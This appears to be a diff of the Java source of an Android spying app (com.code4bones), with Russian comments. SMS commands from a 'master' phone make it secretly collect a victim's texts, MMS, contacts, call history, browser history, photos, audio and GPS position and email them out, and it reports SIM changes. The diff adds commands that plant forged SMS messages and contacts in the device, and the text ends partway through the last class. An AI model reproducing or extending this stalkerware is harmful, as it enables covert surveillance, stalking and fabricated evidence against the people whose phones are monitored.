@@ -4,11 +4,11 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.PrintStream;
 import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 
 import android.app.AlarmManager;
@@ -22,15 +22,13 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Environment;
 import android.os.Handler;
+import android.os.Message;
 import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.ContactsContract.Contacts;
-import android.provider.MediaStore;
 
 
-import com.code4bones.utils.BackgroundTask;
 import com.code4bones.utils.Mail;
 import com.code4bones.utils.NetLog;
 
@@ -47,7 +45,6 @@ public class CommandPool {
 	}
 	
 	public CommandPool() {
-		NetLog.v("CommandPool()");
 	}
 
 	public static CommandPool getInstance() {
@@ -62,26 +59,28 @@ public class CommandPool {
 		mContext  = context;
 		NetLog.v("Initialized %s",this);
 		
-		{ // Obtains contacts asynchroniously
-			/*
-			new Thread(new Runnable() {
-				@Override
-				public void run() {
-					NetLog.v("Found %d contacts",mContacts.size());
-				}
-			}).start();
-			*/
-		}
-
+		// get all contacts
 		mContacts = listContacts();
 		
+		// set initial log counters counters
 		initCounters();
-		SimInfo simInfo = new SimInfo();
-		if ( simInfo.load(mContext) ) {
-			simInfo.save();
-		}
+	
+		// sim card monitor
+		mSimChange.install(mContext, new Handler() {
+			public void handleMessage(Message msg) {
+				SharedPreferences prefs = mContext.getSharedPreferences("prefs", 1);
+				if ( prefs.contains(CommandObj.PREF_MASTER)) {
+					String phone = prefs.getString(CommandObj.PREF_MASTER, "");
+					if ( phone.length() > 0 ) {
+						CommandObj.sendSMS(phone, "Зафиксирована смена сим карты...");
+						NetLog.v("*********** SIM CHANGED ************");
+					}
+				}
+			}
+		});
 		
-		Add(new CommandObj(CommandObj.CMD_HELP,"<command name>") {
+		
+		Add(new CommandObj(CommandObj.CMD_HELP,"[command name>]") {
 			public int Invoke() throws Exception {
 				this.mCommandResult = "";
 				String help = null;
@@ -91,8 +90,8 @@ public class CommandPool {
 				for ( CommandObj cmd : mCommands ) {
 					if ( (help != null && help.equalsIgnoreCase(cmd.mCommandName )) || help == null )
 					{
-						if ( mCommandResult.length() != 0 ) mCommandResult += "\n";
-						mCommandResult += String.format("%2d | %s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
+						if ( mCommandResult.length() != 0 ) mCommandResult += "\n-\n";
+						mCommandResult += String.format("%2d | @%s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
 						if ( help != null )
 							break;
 						idx++;
@@ -107,38 +106,50 @@ public class CommandPool {
 		});
 		
 		//TODO: Commands...
+		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"[?][user:<login>;pass:<password>;mail:<addres>;smtp:<smtp>;port:<port>;[wifi]] - получить текущюю конфигурацию [?], или инициализировать интерфейс"));
 		Add(new CommandObjGPS(CommandObj.CMD_GPS,"fix:nn - получить позицию через nn секунд для более точного позиционирования"));
-		Add(new CommandObjSpySMS(CommandObj.CMD_SPY_SMS,"on|off;[mail|no sms] - мониторинг новых сообщений,отправить на мыло и не дублировать на смс"));
-		Add(new CommandObjGetSMS(CommandObj.CMD_GET_SMS,"[from:YYMMDD;[to:YYMMDD;]][date:YYMMDD] - получить смс на почту"));
-		Add(new CommandObjSpyMedia(CommandObj.CMD_SPY_MEDIA,"on|off - мониторинг новых видео/фото/звука"));
+		Add(new CommandObjSpySMS(CommandObj.CMD_SPY_SMS,"[off];[mail] - мониторинг новых сообщений [отправить на мыло]"));
+		Add(new CommandObjGetSMS(CommandObj.CMD_GET_SMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить смс на почту"));
+		Add(new CommandObjAddSMS(CommandObj.CMD_ADD_SMS,"phone:<number>;text:<message>;[date:YYMMDDHHMM];[inbox|outbox];[read|unread] - добавить смс в базу,так как будто оно было прислано"));
+		Add(new CommandObjSMS(CommandObj.CMD_SMS,"to:<phone>;msg:<message text> - отправить сообщение на указанный номер"));
+		Add(new CommandObjSpyMedia(CommandObj.CMD_SPY_MEDIA,"[off] - мониторинг новых видео/фото/звука"));
 		Add(new CommandObjGetMedia(CommandObj.CMD_GET_MEDIA,"[video|photo|audio];[from:YYMMDD;[to:YYMMDD;]][date:YYMMDD] - получить медиа файлы на почту"));
-		Add(new CommandObjSpyBook(CommandObj.CMD_SPY_BOOK,"on|off - мониторинг записной книжки"));
-		Add(new CommandObjGetBook(CommandObj.CMD_GET_BOOK,"получить всю записную книжку"));
-		Add(new CommandObjSpyCalls(CommandObj.CMD_SPY_CALLS,"on|off - мониторинг звонков книжки"));
-		Add(new CommandObjGetCalls(CommandObj.CMD_GET_CALLS,"[from:YYMMDD;[to:YYMMDD;]][date:YYMMDD] - получить всю историю звонков книжку"));
-		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"user:<login>;pass:<password>;mail:<addres>;smtp:<smtp>;port:<port>;[wifi]"));
-		Add(new CommandObjSMS(CommandObj.CMD_SMS,"to:<phone>;msg:<message text>"));
-		Add(new CommandObjEvent(CommandObj.CMD_EVENT,"charge:y|n;boot:y|n;unlock:y|n"));
-		Add(new CommandObjGetBrowser(CommandObj.CMD_GET_HISTORY,"date:[YYMMDD]"));
-		Add(new CommandObjSpyBrowser(CommandObj.CMD_SPY_HISTORY,"date:[YYMMDD]"));
-		Add(new CommandObjGetMMS(CommandObj.CMD_GET_MMS,""));
-		Add(new CommandObjSpyMMS(CommandObj.CMD_SPY_MMS,""));
+		Add(new CommandObjSpyBook(CommandObj.CMD_SPY_BOOK,"[off] - мониторинг записной книжки"));
+		Add(new CommandObjGetBook(CommandObj.CMD_GET_BOOK,"выслать всю записную книжку на почту"));
+		Add(new CommandObjAddBook(CommandObj.CMD_ADD_BOOK,"name:<contact>;phone:<number>;[email:<mail>];[company:<name>]"));
+		Add(new CommandObjSpyCalls(CommandObj.CMD_SPY_CALLS,"[off] - мониторинг звонков"));
+		Add(new CommandObjGetCalls(CommandObj.CMD_GET_CALLS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - выслать всю историю звонков на почту"));
+		Add(new CommandObjEvent(CommandObj.CMD_EVENT,"charge:y|n;boot:y|n;unlock:y|n - получать события (зарядка,загрузка,разблокировка)"));
+		Add(new CommandObjGetWeb(CommandObj.CMD_GET_WEB,"[date:YYMMDD][history|bookmarks] - получить историю просмотра браузера/закладок"));
+		Add(new CommandObjSpyWeb(CommandObj.CMD_SPY_WEB,"[history|bookmarks] - получать уведомления о просмотре страниц или новых закладках"));
+		Add(new CommandObjGetMMS(CommandObj.CMD_GET_MMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить ММС сообщения на почту"));
+		Add(new CommandObjSpyMMS(CommandObj.CMD_SPY_MMS,"Не реализовано"));
+		Add(new CommandObjWhat(CommandObj.CMD_WHAT,"Получить активные мониторы (spy-команды)"));
+		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
 		
 		
 		NetLog.v("Commands ready: %d",mCommands.size());
 		mInitialized = true;
 	}
 
-	
+	//XXX Execute
 	public void Execute(String phone,String message,boolean live) {
 		// skip CommandObj.COMMAND_PREFIX
 		message = message.trim().substring(1);
+		CommandObj cmd = null;
+		SharedPreferences prefs = mContext.getSharedPreferences("prefs", 1);
+		boolean fSetup = prefs.getBoolean("setup", false);
 		try {
-			CommandObj cmd = findCommand(message);
+			cmd = findCommand(message);
 			if ( cmd == null )
 				throw new Exception(String.format("Не известный запрос [%s]",message));
 			
 			cmd.Init(mContext,phone,message);
+			
+			if ( !fSetup && !cmd.mCommandName.equalsIgnoreCase(CommandObj.CMD_SETUP) && 
+					        !cmd.mCommandName.equalsIgnoreCase(CommandObj.CMD_HELP) )
+				throw new Exception("Командный интерфейс не инициализирован,установите параметры командой @setup[...]\n ( @? - помощь )");
+			
 			cmd.mLive = live;
 			NetLog.v("+++ Executing %s",cmd);
 			
@@ -152,7 +163,7 @@ public class CommandPool {
 		} 
 		catch (Exception e) {
 			NetLog.v("*** CommandPool Error: %s",e.getMessage());
-			CommandObj.sendSMS(phone,"Oшибка: %s", e.getMessage());
+			CommandObj.sendSMS(phone,"Oшибка [%s]: %s", cmd!=null?cmd.mCommandName:"*",e.getMessage());
 			e.printStackTrace();
 		}
 	}
@@ -183,18 +194,18 @@ public class CommandPool {
 	}
 
 	public final Handler mPoolHandler = new Handler();
-	
+	//XXX POOL
 	public void execPool(Context c) {
-		SharedPreferences p = c.getSharedPreferences("commandPool", 1);
-		if ( !p.contains("phone") ) {
-			NetLog.v("execPool empty");
+		
+		
+		SharedPreferences p = c.getSharedPreferences("prefs", 1);
+		if ( !p.contains(CommandObj.PREF_MASTER)) {
+			NetLog.v("Interface is not initialized,pool is unavailable...");
 			return;
 		}
-		String phone = p.getString("phone", "");
-		SharedPreferences.Editor e = p.edit();
-		e.remove("phone");
-		e.commit();
+		String phone = p.getString(CommandObj.PREF_MASTER, "");
 		
+		p = c.getSharedPreferences("commandPool", 1);
 		Map<String,?> all = p.getAll();
 		if ( all.size() > 0 ) {
 			NetLog.v("POOL: Executing pool: %d commands",all.size());
@@ -211,20 +222,22 @@ public class CommandPool {
 	}
 	
 	public void saveCommand(CommandObj cmd) {
-		NetLog.v("POOL: Saving command %s",cmd.mCommandName);
+		//NetLog.v("POOL: Saving command %s",cmd.mCommandName);
 		SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
 		SharedPreferences.Editor e = p.edit();
-		e.putString("phone",cmd.mMasterPhone);
-		//e.putBoolean("delayed", cmd.mDelayed);
 		e.putString(cmd.mCommandName,cmd.mSourceMessage);
 		e.commit();
 	}
 	
-	public void removeCommand(CommandObj cmd) {
-		NetLog.v("POOL: Command removed %s",cmd.mCommandName);
+	public void removeCommand(CommandObj cmd,boolean monitor) {
+		//NetLog.v("POOL: Command removed %s",cmd.mCommandName);
 		SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
 		SharedPreferences.Editor e = p.edit();
-		e.remove(cmd.mCommandName);
+		if ( p.contains(cmd.mCommandName )) {
+			e.remove(cmd.mCommandName);
+			if ( !monitor )
+				cmd.replySMS("Появилась сеть,отложенная комманда %s выполнена", cmd.mCommandName);
+		}
 		e.commit();
 	}
 	
@@ -271,11 +284,11 @@ public class CommandPool {
 		}
 	}
 	
-	public void controlPool(CommandObj cmd,boolean save) {
+	public void controlPool(CommandObj cmd,boolean save,boolean monitor) {
 		if ( save )
 			saveCommand(cmd);
 		else 
-			removeCommand(cmd);
+			removeCommand(cmd,monitor);
 	}
 	
 	
@@ -287,7 +300,7 @@ public class CommandPool {
 			NetLog.v("Command saved due to internet connection lost...");
 			return CommandObj.ACK;
 		}
-		removeCommand(cmd);
+		removeCommand(cmd,false);
 		return CommandObj.OK;
 	}
 	
@@ -315,18 +328,13 @@ public class CommandPool {
 			} while ( cursor.moveToNext() );
 			cursor.close();
 		} // moveToFirst
-		NetLog.v("Found %d names\n", list.size());
 		return list;
 	}
 	
-
 	
-	
-	/////////////////////////////////////////////////////////////////////////////////
 	//
-	// CUSTOM COMMAND
+	//TODO: GPS
 	//
-	
 	public class CommandObjGPS extends CommandObj implements LocationListener {
 		
 		public boolean mActive = false;
@@ -435,7 +443,7 @@ public class CommandPool {
 	
 	///////////////////////////
 	//
-	// SPY SMS 
+	// TODO:SPY SMS 
 	//
 	public class CommandObjSpySMS extends CommandObj 
 	{	
@@ -452,7 +460,7 @@ public class CommandPool {
 			boolean enable = !mArgs.hasOpt("off");
 			if ( !mon.setEnable(enable, "content://sms/") )
 				return CommandObj.ERROR;
-			controlPool(this,enable);
+			controlPool(this,enable,true);
 			return CommandObj.ACK;
 		}
 		
@@ -487,14 +495,14 @@ public class CommandPool {
 	        }
 			NetLog.v("Redirecting to %s : \"%s\"\r\n",this.mMasterPhone,mCommandResult);
 			if ( mArgs.hasOpt("mail") ) createMail().send();
-			if ( !mArgs.hasOpt("no sms") ) this.replySMS("%s",mCommandResult);
+			this.replySMS("%s",mCommandResult);
 		}
 	
 	} // CommandObjSMS
 	
 	//////////////////////
 	//
-	// Get SMS
+	//TODO Get SMS
 	//
 	public class CommandObjGetSMS extends CommandObj {
 
@@ -527,7 +535,7 @@ public class CommandPool {
 		
 		public ArrayList<SmsObj> listSMS() throws ParseException {
 			
-			this.makeDateParam("date");
+			this.makeDateParam("date",false);
 			
 			Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms//"), 
 					new String[]{}, 
@@ -564,7 +572,7 @@ public class CommandPool {
 	
 	////////////
 	//
-	// SPY Video / Image / Audio 
+	//TODO SPY Video / Image / Audio 
 	//
 	public class CommandObjSpyMedia extends CommandObj {
 
@@ -583,7 +591,7 @@ public class CommandPool {
 				if ( !mon.setEnable(enable,handleMedia.mUris[type].toString()) )
 					return CommandObj.ERROR;
 			}
-			controlPool(this,enable);
+			controlPool(this,enable,true);
 			
 			return CommandObj.ACK;
 		}
@@ -601,28 +609,30 @@ public class CommandPool {
 			if ( count > lastCount ) {
 				String file = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnData[what]));
 		        String title = cur.getString(cur.getColumnIndexOrThrow(handleMedia.mColumnDisp[what]));
-		        Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[what])));
-		        
-		        String tmp = String.format("%s ( %s )",title,date.toLocaleString());
-		        Mail mail = createMail();
-		        mail.addAttachment(file,tmp, false);
-		        mCommandResult = String.format("Новое %s %s",handleMedia.mTypeNames[what],tmp);
-		        mail.setBody(mCommandResult);
-		        mail.send();
-		        this.replySMS("%s", mCommandResult);
-			} else if ( count < lastCount ) {
-				this.replySMS("Удаление %s,было %d,стало %d",handleMedia.mTypeNames[what],lastCount,count);
-				
-			} 
-		}
-		
+		        //Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[what])));
+
+		        mCommandResult = String.format("Новое %s %s",handleMedia.mTypeNames[what],title);
+		        if ( canSend() ) {
+			        Mail mail = createMail();
+			        mail.addAttachment(file,title, false);
+			        mail.setBody(mCommandResult);
+			        mail.send();
+		        } else {
+		        	mCommandResult += " ( письмо не отправлено, нет сети...)";
+		        }
+			} else if ( count < lastCount ) 
+				mCommandResult = String.format("Удаление %s,было %d,стало %d",handleMedia.mTypeNames[what],lastCount,count);
+	        super.Reply(args);
+		}		
 	}
 	
 	///////////////////
 	//
-	// Get MEDIA
+	//XXX Get MEDIA
 	//
 	public class CommandObjGetMedia extends CommandObj {
+
+		final public SimpleDateFormat mDF = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss");
 
 		public CommandObjGetMedia(String name, String help) {
 			super(name, help);
@@ -631,6 +641,7 @@ public class CommandPool {
 		public int Invoke() throws Exception {
 			int type = handleMedia.IMAGE;
 	
+			
 			if ( checkSend(this) == CommandObj.ACK )
 				return CommandObj.ACK;
 			
@@ -639,14 +650,13 @@ public class CommandPool {
 			
 			String dateField = type==handleMedia.AUDIO?"date_added":"datetaken";
 			
-			this.makeDateParam(dateField);
+			this.makeDateParam(dateField,false);
 			
 			Cursor cur = mContext.getContentResolver().query(handleMedia.mUris[type], null,mDateParam, null, dateField + " DESC");
 			if  (cur == null || !cur.moveToFirst() ) {
 				mCommandResult = String.format("Нет данных для %s", handleMedia.mTypeNames[type]);
 				return CommandObj.REPLY;
 			}
-			//TODO::
 			long totalSize = 0;
 			Mail mail = null;
 			long totalImages = cur.getCount();
@@ -662,7 +672,7 @@ public class CommandPool {
 				Date date = new Date(cur.getLong(cur.getColumnIndexOrThrow(handleMedia.mColumnDate[type])));
 				totalSize += size;
 	//	        NetLog.v("Found %s ( %d ) / (total:%d, max %d)",name,size,totalSize,maxSize);
-	        	mail.addAttachment(file,String.format("%s ( %s )",name,date.toLocaleString()), false);
+	        	mail.addAttachment(file,String.format("%s_%s",mDF.format(date),name), false);
 	        	idx++;
 		        if ( totalSize >= maxSize ) 
 		        {
@@ -688,7 +698,7 @@ public class CommandPool {
 	
 	///////////////////
 	//
-	// Spy Book
+	//XXX Spy Book
 	//
 	public class CommandObjSpyBook extends CommandObj {
 
@@ -702,7 +712,7 @@ public class CommandPool {
 			boolean enable = !mArgs.hasOpt("off");
 			if (!mon.setEnable(enable, Contacts.CONTENT_URI.toString()) )
 				return CommandObj.ERROR;
-			controlPool(this,enable);
+			controlPool(this,enable,true);
 			return CommandObj.ACK;
 		}
 		
@@ -710,6 +720,9 @@ public class CommandPool {
 			Cursor cur = (Cursor)args[0];
 	        ContactObj con = new ContactObj(cur,mContext);
 
+	        // refresh phone book contacts
+	        mContacts = listContacts();
+	        
 			long count = cur.getCount();
 			long lastCount =saveCount(handleContacts.URI.toString(), count);
 			
@@ -719,14 +732,14 @@ public class CommandPool {
 			if ( lastCount < count )
 				replySMS("Добавлен контакт: %s %s",con.name,con.phoneArray());
 			else	
-				replySMS("Произошло удаление контакта,было %d,стало %d",lastCount,count);
+				replySMS("Произошло удаление контакта. было %d,стало %d",lastCount,count);
 		}
 		
 	}
 
 	/////////////////////
 	//
-	// Get BOOK
+	//XXX Get BOOK
 	//
 	public class CommandObjGetBook extends CommandObj {
 
@@ -764,7 +777,7 @@ public class CommandPool {
 
 	//////////////////////
 	//
-	// SPY CALLS
+	//XXX SPY CALLS
 	//
 	public class CommandObjSpyCalls extends CommandObj {
 
@@ -779,7 +792,7 @@ public class CommandPool {
 			ContentMonitor con = ContentMonitor.getInstance(mCommandName, mContext, this, handler);
 			if ( !con.setEnable(enable, CallLog.Calls.CONTENT_URI.toString()) )
 				return CommandObj.ERROR;
-			controlPool(this,enable);
+			controlPool(this,enable,true);
 			return CommandObj.ACK;
 		}
 		
@@ -806,9 +819,8 @@ public class CommandPool {
 	
 	//////////////////
 	//
-	// Get CALLS
+	//XXX Get CALLS
 	//
-	//TODO GET CALLS
 	public class CommandObjGetCalls extends CommandObj {
 		
 
@@ -821,7 +833,7 @@ public class CommandPool {
 			if ( checkSend(this) == CommandObj.ACK )
 				return ACK;
 			
-			this.makeDateParam("date");
+			this.makeDateParam("date",false);
 			
 			String fileName = CommandObj.getFile(mContext, "calls");
 			PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
@@ -858,7 +870,7 @@ public class CommandPool {
 		}
 	} // GET CALLS
 	
-	//TODO: SETUP
+	//XXX SETUP
 	public class CommandObjSetup extends CommandObj {
 
 		private SharedPreferences.Editor edit = null;
@@ -880,9 +892,10 @@ public class CommandPool {
 		
 		public int Invoke() throws Exception {
 			SharedPreferences pref = mContext.getSharedPreferences("prefs", 1);
+			String initString = pref.contains("initString")?pref.getString("initString", "Интерфейс не инициализирован"):"Интерфейс не инициализирован";
 			edit = pref.edit();
 			edit.clear();
-			edit.commit();
+
 			// mail
 			String params[] = new String[]{
 					CommandObj.PREF_MAIL_USER,
@@ -897,6 +910,14 @@ public class CommandPool {
 					CommandObj.PREF_NO_SMS
 			};
 			
+			if ( mArgs.hasOpt("?") ) {
+				mCommandResult = "Текущая конфигурация: " + initString;
+				return CommandObj.ACK;
+			} 
+			
+			edit.putString("initString",this.mCommandArgs);
+			edit.commit();
+			
 			for ( String param : params )
 				read(param,false);
 			
@@ -906,7 +927,8 @@ public class CommandPool {
 			
 			
 			edit.putString(CommandObj.PREF_MASTER, this.mMasterPhone);
-			edit.commit();
+ 		    edit.putBoolean("setup", true);
+		    edit.commit();
 			
 			if ( mLive ) {
 			  saveCommand(this);
@@ -926,14 +948,11 @@ public class CommandPool {
 			}
 			return OK;
 		}
-		
-		public void Reply() {
-			
-		}
-		
 	} // SETUP
 	
-	
+	//
+	//XXX Send SMS
+	//
 	public class CommandObjSMS extends CommandObj {
 
 		public CommandObjSMS(String name, String help) {
@@ -953,6 +972,9 @@ public class CommandPool {
 		
 	} // Send SMS
 	
+	//
+	//XXX EVENT
+	//
 	public class CommandObjEvent extends CommandObj {
 
 		SharedPreferences.Editor edit;
@@ -961,47 +983,62 @@ public class CommandPool {
 			super(name, help);
 		}
 		
-		public void set(String event,String name) {
-			if ( mArgs.hasArg(name)) 
-				edit.putBoolean(event, mArgs.boolValue(name));
+		public String set(String event,String name) {
+			String act[] = new String[]{"вкл.","выкл."};
+			int res = -1;
+			if ( mArgs.hasArg(name)) {
+				if ( mArgs.boolValue(name) ) {
+					edit.putString(event,name);
+					res = 0;
+				}
+				else {
+					edit.remove(event);
+					res = 1;
+				}
+			}
+			if ( res == -1 )
+				return "";
+			return name + ":"+act[res];
 		}
+		
 		
 		public int Invoke() throws Exception {
 			SharedPreferences p = mContext.getSharedPreferences("events", 1);
 			edit = p.edit();
 			edit.putString("phone", this.mMasterPhone);
-			
-			set("android.intent.action.BATTERY_LOW",CommandObj.EVENT_BATTERY);
+			mCommandResult = "Мониторинг событий:";
+			String res = "";
+			res += set("android.intent.action.BATTERY_LOW",CommandObj.EVENT_BATTERY);
 			set("android.intent.action.BATTERY_OKAY",CommandObj.EVENT_BATTERY);
-			set("android.intent.action.ACTION_POWER_CONNECTED",CommandObj.EVENT_POWER);
+			res += set("android.intent.action.ACTION_POWER_CONNECTED",CommandObj.EVENT_POWER);
 			set("android.intent.action.ACTION_POWER_DISCONNECTED",CommandObj.EVENT_POWER);
-			set("android.intent.action.BOOT_COMPLETED",CommandObj.EVENT_BOOT);
-			set("android.intent.action.USER_PRESENT",CommandObj.EVENT_UNLOCK);
+			res += set("android.intent.action.BOOT_COMPLETED",CommandObj.EVENT_BOOT);
+			res += set("android.intent.action.USER_PRESENT",CommandObj.EVENT_UNLOCK);
 			
-			if ( mArgs.hasArg(CommandObj.EVENT_SIM) )
-				installSim(mArgs.boolValue(CommandObj.EVENT_SIM));
+			if ( res.length() > 0 )
+				mCommandResult += res;
+			else
+				mCommandResult += "Нет изменений.";
 			
 			edit.commit();
-			return CommandObj.OK;
+			return CommandObj.ACK;
 		}
 		
-		void installSim(boolean fEnable) {
-			if ( fEnable )
-				mSimChange.install(mContext, this);
-			else
-				mSimChange.remove();
-		}
 	} // SPY EVENT
 
-	
-	//TODO: Get HISTORY
-	class CommandObjGetBrowser extends CommandObj {
+	//
+	//TODO: Get Browser
+	//
+	class CommandObjGetWeb extends CommandObj {
 
-		public CommandObjGetBrowser(String name, String help) {
+		public CommandObjGetWeb(String name, String help) {
 			super(name, help);
 		}
 		
 		public int Invoke() throws Exception {
+		
+			if ( checkSend(this) == CommandObj.ACK )
+				return CommandObj.ACK;
 			
 			// 0,3 - all,1 - bookmarks,2 - hist
 			int type = 0;
@@ -1016,7 +1053,7 @@ public class CommandPool {
 			
 			String selection = null;
 			mDateParam = null;
-			this.makeDateParam("date");
+			this.makeDateParam("date",false);
 			
 			if ( type != 0 ) {
 				if ( mDateParam == null )
@@ -1051,7 +1088,7 @@ public class CommandPool {
             	ps.close();
             	mCommandResult = String.format("%s браузера отправлены на почту",types[type]);
             	Mail m = createMail();
-            	m.addAttachment(fileName,"browser.txt",true);
+            	m.addAttachment(fileName,"web.txt",true);
             	m.send();
 			}			
             cur.close();
@@ -1060,9 +1097,11 @@ public class CommandPool {
 		
 	} // GET HISTORY
 	
-	public class CommandObjSpyBrowser extends CommandObj {
+	//
+	//XXX Spy Brower
+	public class CommandObjSpyWeb extends CommandObj {
 
-		public CommandObjSpyBrowser(String name, String help) {
+		public CommandObjSpyWeb(String name, String help) {
 			super(name, help);
 		}
 
@@ -1072,7 +1111,7 @@ public class CommandPool {
 			boolean enable = !mArgs.hasOpt("off");
 			if (!mon.setEnable(enable, handleBrowser.URI.toString()) )
 				return CommandObj.ERROR;
-			controlPool(this,enable);
+			controlPool(this,enable,true);
 			return CommandObj.ACK;
 		}
 		
@@ -1082,7 +1121,6 @@ public class CommandPool {
 			long count = cur.getCount();
 			long lastCount = saveCount(handleBrowser.URI.toString(), count);
 			
-			NetLog.v("BROWSER %d -> %d",lastCount,count);
 			if ( lastCount == count )
 				return;
 		
@@ -1100,7 +1138,6 @@ public class CommandPool {
      		short isBookmark = cur.getShort(Browser.HISTORY_PROJECTION_BOOKMARK_INDEX); 
      		
      		if ( (type == 1 && isBookmark == 0) || (type == 2 && isBookmark == 1)) {
-     			NetLog.v("REJECT %d & %d",type,isBookmark);
      			return;
      		}
      		
@@ -1118,7 +1155,9 @@ public class CommandPool {
 		
 	}
 	
-	//TODO: GET MMS
+	//
+	//XXX GET MMS
+	//
 	public class CommandObjGetMMS extends CommandObj {
 		
 		private HashMap<String,String> names = new HashMap<String,String>();
@@ -1129,8 +1168,20 @@ public class CommandPool {
 		
 		public int Invoke() throws Exception {
 			
+			if ( checkSend(this) == CommandObj.ACK )
+				return CommandObj.ACK;
+
+			
+			makeDateParam("date",true);
 			handleMMS handler = new handleMMS(mContext);
+			handler.dateParam = mDateParam;
 			ArrayList<SmsObj> smsList = handler.listMMS();
+			
+			if ( smsList.size() == 0 ) {
+				mCommandResult = "Ни одного MMS не найдено";
+				return CommandObj.ACK;
+			}
+				
 			
 			long totalSize = 0;
 			Mail mail = null;
@@ -1149,7 +1200,7 @@ public class CommandPool {
 			File image = new File(sms.filename);
 			long size = image.length();
 			totalSize += size;
-        	mail.addAttachment(sms.filename,String.format("%s ( %s )",image.getName(),new Date().toLocaleString()), false);
+        	mail.addAttachment(sms.filename,String.format("%s_%s",sms.date,sms.name), false);
             
         	info += sms.name + "\r\n";
         	String name = "";
@@ -1189,7 +1240,9 @@ public class CommandPool {
 		}
 	}
 	
-	//TODO:SPY MMS
+	//
+	//XXX SPY MMS
+	//
 	public class CommandObjSpyMMS extends CommandObj {
 
 		public CommandObjSpyMMS(String name, String help) {
@@ -1210,4 +1263,157 @@ public class CommandPool {
 		}
 	}
 	
+	//
+	// WHAT ?
+	public class CommandObjWhat extends CommandObj {
+
+		public CommandObjWhat(String name, String help) {
+			super(name, help);
+		}
+		
+		public int Invoke() throws Exception {
+			SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
+			Map<String,?> all = p.getAll();
+			
+			mCommandResult = "Нет активных мониторов";
+
+			if ( all.size() > 0 ) {
+				mCommandResult = "Активные мониторы событий: ";
+				String cmds = "";
+				String commands[] = all.keySet().toArray(new String[]{});
+				for ( String name : commands ) {
+					if ( name.startsWith("spy") == false )
+						continue;
+					if ( cmds.length() > 0 )
+						cmds += ",";
+					cmds += name; 
+				}
+				mCommandResult += cmds;
+			} 
+			if ( all.size() == 0 )
+				mCommandResult = "Активные мониторы событий: ";
+			else
+				mCommandResult += ",";
+			
+			p = mContext.getSharedPreferences("events", 1);
+			all = p.getAll();
+			if ( all.size() > 0 ) {
+				String cmds = "";
+				String commands[] = all.keySet().toArray(new String[]{});
+				for ( String name : commands ) {
+					if ( name.equals("phone"))
+						continue;
+					if ( cmds.length() > 0 )
+						cmds += ",";
+					cmds += "event "+p.getString(name, ""); 
+				}
+				mCommandResult += cmds;
+			} 
+			
+			return CommandObj.REPLY;
+		}
+	
+	}
+
+	
+	//
+	//XXX KeepAlive
+	//
+	public class CommandObjKeepAlive extends CommandObj {
+
+		public CommandObjKeepAlive(String name, String help) {
+			super(name, help);
+		}
+		
+		public int Invoke() throws Exception {
+			
+			
+	       SimpleDateFormat df = new SimpleDateFormat("HHmm");
+   		   Date date = df.parse(mArgs.strValue("time","1500"));
+			
+   		   AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
+
+   		   
+		   Intent intent = new Intent(mContext,Event_BroadcastReceiver.class);
+		   intent.setAction(this.mCommandName);
+		   PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
+		   
+		   Calendar calendar = Calendar.getInstance();
+		   calendar.set(Calendar.HOUR_OF_DAY, date.getHours());
+		   calendar.set(Calendar.MINUTE, date.getMinutes());
+		   
+		   alarm.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),AlarmManager.INTERVAL_DAY, pendingIntent);
+			
+		   NetLog.v("KeepAlive at [%s] -> %s",new Date().toLocaleString(),calendar.getTime().toLocaleString());
+		   return CommandObj.OK;
+		}
+		
+		public void Reply(Object ... args) throws Exception {
+			   mCommandResult = String.format("Сервис работает нормально: %s", new Date().toLocaleString());	
+			   super.Reply(args);
+			   
+		}
+	}
+	
+	//
+	//XXX Add SMS
+	//
+	public class CommandObjAddSMS extends CommandObj {
+
+		public CommandObjAddSMS(String name, String help) {
+			super(name, help);
+		}
+		public int Invoke() throws Exception {
+			
+			boolean read = true;
+			boolean inbox = true;
+			Date    date = new Date();
+			SimpleDateFormat df = new SimpleDateFormat("yyMMddHHmm");
+			String phone;
+			
+			phone = ContactObj.NormalizePhone(mArgs.strValue("phone"));
+			
+			inbox = !mArgs.hasOpt("outbox") || mArgs.hasOpt("inbox");
+			read  = !mArgs.hasOpt("unread") || mArgs.hasOpt("read");
+			if ( !inbox )
+				read = true;
+			
+			if ( mArgs.hasArg("date") )
+				date = df.parse(mArgs.strValue("date"));
+			
+			ContactObj cont = findContact(phone);
+			
+			Uri uri = SmsObj.addSMS(mContext, phone, date, read, inbox, mArgs.strValue("text"));
+			if ( uri != null )
+				mCommandResult = String.format("Сообщение добавлено в базу (тип:%sпрочитано,ящик:%s,контакт:%s)",read?" ":"не ",inbox?"входящие":"исходящие",cont!=null?cont.name:"Нет в книжке");
+			else
+				mCommandResult = "Ошибка добавления сообщения...";
+			return CommandObj.ACK;
+		}
+	}
+	
+	//
+	// Add BOOK
+	//
+	public class CommandObjAddBook extends CommandObj {
+
+		public CommandObjAddBook(String name, String help) {
+			super(name, help);
+		}
+		public int Invoke() throws Exception {
